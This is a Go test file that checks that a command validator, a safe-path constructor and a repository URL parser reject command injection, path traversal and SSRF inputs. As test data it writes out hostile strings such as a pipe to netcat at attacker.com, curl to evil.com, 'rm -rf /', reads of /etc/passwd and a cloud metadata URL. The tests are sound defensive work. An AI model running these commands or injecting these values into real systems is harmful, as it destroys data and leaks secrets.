package security

import (
	"testing"

	"github.com/glive/domain/values"
)

func TestCommandInjectionPrevention(t *testing.T) {
	validator := values.NewCommandValidator()

	injectionAttempts := []struct {
		name    string
		command string
	}{
		{"semicolon injection", "npm install; rm -rf /"},
		{"pipe injection", "npm install | nc attacker.com 1234"},
		{"ampersand injection", "npm install && curl evil.com"},
		{"backtick injection", "npm install `whoami`"},
		{"dollar paren injection", "npm install $(cat /etc/passwd)"},
		{"redirect injection", "npm install > /etc/passwd"},
		{"newline injection", "npm install\nrm -rf /"},
		{"null byte injection", "npm install\x00rm -rf /"},
		{"env var expansion", "npm install $HOME"},
		{"windows env var", "npm install %USERPROFILE%"},
		{"command substitution backtick", "npm install `cat /etc/passwd`"},
		{"command substitution dollar", "npm install $(whoami)"},
		{"shell execution", "bash -c 'rm -rf /'"},
		{"powershell execution", "powershell /c 'rm -rf /'"},
	}

	for _, tt := range injectionAttempts {
		t.Run(tt.name, func(t *testing.T) {
			_, err := validator.Validate(tt.command, "/tmp")
			if err == nil {
				t.Errorf("expected injection attempt to be blocked: %s", tt.command)
			}
		})
	}
}

func TestPathTraversalPrevention(t *testing.T) {
	traversalAttempts := []struct {
		name string
		path string
	}{
		{"basic traversal", "../../../etc/passwd"},
		{"encoded traversal", "..%2f..%2f..%2fetc/passwd"},
		{"null byte", "/safe/path\x00../../etc/passwd"},
		{"backslash traversal", "..\\..\\..\\windows\\system32"},
		{"mixed separators", "../..\\../etc/passwd"},
	}

	for _, tt := range traversalAttempts {
		t.Run(tt.name, func(t *testing.T) {
			_, err := values.NewSafePath(tt.path, "/allowed/root")
			if err == nil {
				t.Errorf("expected path traversal to be blocked: %s", tt.path)
			}
		})
	}
}

func TestURLInjectionPrevention(t *testing.T) {
	urlAttempts := []struct {
		name string
		url  string
	}{
		{"localhost", "http://localhost/repo"},
		{"127.0.0.1", "http://127.0.0.1/repo"},
		{"file protocol", "file:///etc/passwd"},
		{"internal ip", "http://192.168.1.1/repo"},
		{"ssrf attempt", "http://169.254.169.254/latest/meta-data"},
		{"path traversal in url", "https://github.com/user/../etc"},
		{"control characters", "https://github.com/user/repo\x00"},
	}

	for _, tt := range urlAttempts {
		t.Run(tt.name, func(t *testing.T) {
			_, err := values.ParseRepoURL(tt.url)
			if err == nil {
				t.Errorf("expected malicious URL to be blocked: %s", tt.url)
			}
		})
	}
}

func TestCommandAllowlist(t *testing.T) {
	validator := values.NewCommandValidator()

	allowedCommands := []string{
		"npm install",
		"pip install -r requirements.txt",
		"go build",
		"python -m venv venv",
		"node index.js",
		"docker build .",
		"git clone",
	}

	for _, cmd := range allowedCommands {
		t.Run(cmd, func(t *testing.T) {
			_, err := validator.Validate(cmd, "/tmp")
			if err != nil {
				t.Errorf("expected allowed command to pass validation: %s, error: %v", cmd, err)
			}
		})
	}

	blockedCommands := []string{
		"rm -rf /",
		"curl http://evil.com",
		"nc -l 1234",
		"shutdown -h now",
		"format C:",
	}

	for _, cmd := range blockedCommands {
		t.Run(cmd, func(t *testing.T) {
			_, err := validator.Validate(cmd, "/tmp")
			if err == nil {
				t.Errorf("expected blocked command to fail validation: %s", cmd)
			}
		})
	}
}


